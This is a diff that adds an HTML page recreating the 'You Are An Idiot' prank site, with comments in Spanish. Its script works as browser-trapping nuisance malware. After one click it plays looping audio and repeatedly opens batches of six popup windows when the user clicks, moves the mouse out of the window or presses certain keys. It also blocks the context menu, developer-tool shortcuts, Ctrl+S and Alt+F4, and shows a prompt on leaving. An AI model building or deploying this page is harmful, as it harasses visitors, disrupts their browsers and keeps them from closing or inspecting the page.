@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>You Are An Idiot!</title>
+    <meta name="author" content="youdontknowwhoiam">
+    
+    <!-- Meta descripción exacta solicitada para el Home -->
+    <meta name="description" content="This is the orgional and the best flash video on the 'net. Once found on www.youdontknowwhoiam.org, not found where it belong, right here on ...">
+
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            cursor: default;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+
+        /* Pantalla de inicio con el botón naranja centrado */
+        .intro-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #ffffff;
+            z-index: 200;
+        }
+
+        .play-button-orange {
+            width: 200px;
+            height: 200px;
+            background: linear-gradient(135deg, #ff9e42, #ff3d3d);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 10px 25px rgba(255, 61, 61, 0.3);
+            transition: transform 0.2s ease;
+        }
+
+        .play-triangle {
+            width: 0;
+            height: 0;
+            border-top: 30px solid transparent;
+            border-bottom: 30px solid transparent;
+            border-left: 50px solid #ffffff;
+            margin-left: 15px; 
+        }
+
+        /* Contenedor principal que aloja el contenido */
+        .idiot-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0; 
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        .idiot-container img {
+            height: 100vh;
+            width: auto;
+            max-width: 100vw;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="pantalla-inicio" class="intro-screen">
+        <div class="play-button-orange" onclick="iniciarProyecto(event)">
+            <div class="play-triangle"></div>
+        </div>
+    </div>
+
+    <div id="contenido-principal" class="idiot-container">
+        <audio id="audio-idiot" src="you-are-an-idiot.mp3" loop></audio>
+        <img src="yesyouare.png" alt="You Are An Idiot" draggable="false" oncontextmenu="return false;">
+    </div>
+
+    <script>
+        const pantallaInicio = document.getElementById('pantalla-inicio');
+        const contenidoPrincipal = document.getElementById('contenido-principal');
+        const audio = document.getElementById('audio-idiot');
+        
+        let interactuado = false;
+
+        function iniciarProyecto(e) {
+            e.stopPropagation(); 
+            if (!interactuado) {
+                interactuado = true;
+                audio.play().catch(err => console.log(err));
+                
+                pantallaInicio.style.display = 'none';
+                contenidoPrincipal.style.opacity = '1';
+                
+                // Lanza el castigo inicial de 6 ventanas
+                proCreate();
+                
+                document.body.addEventListener('click', () => {
+                    openWindow('lol.html');
+                });
+            }
+        }
+
+        function openWindow(url) {
+            var aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+            if (aWindow) {
+                try {
+                    aWindow.blur();
+                    window.focus();
+                } catch(e) {}
+                setTimeout(() => {
+                    try { aWindow.opener = null; } catch(e) {}
+                }, 150);
+            }
+        }
+
+        // Abre exactamente 6 ventanas de golpe
+        function proCreate() {	
+            for (var i = 0; i < 6; i++) {
+                openWindow('lol.html');
+            }
+        }
+
+        window.onmouseout = function () {
+            if (interactuado) {
+                proCreate();
+            }
+            return null;
+        };
+
+        window.addEventListener('beforeunload', function (e) {
+            e.preventDefault();
+            e.returnValue = 'Are you an idiot?';
+        });
+
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        
+        // INTERCEPCIÓN TOTAL DE COMANDOS PROHIBIDOS
+        document.addEventListener('keydown', function(e) {
+            var keyCode = e.keyCode || e.which;
+            
+            if (
+                e.key === 'F12' || keyCode == 123 || 
+                (e.altKey && (e.key === 'F4' || keyCode == 115)) || 
+                (e.ctrlKey && (e.key === 's' || e.key === 'S' || keyCode == 83)) || 
+                (e.ctrlKey && (e.key === 'u' || e.key === 'U' || keyCode == 85)) || 
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || keyCode == 73 || keyCode == 74 || keyCode == 67))
+            ) {
+                e.preventDefault();
+                alert("You are an idiot!");
+                if (interactuado) {
+                    proCreate(); // Lanza 6 popups de castigo
+                }
+                return false;
+            }
+        });
+    </script>
+</body>
+</html>
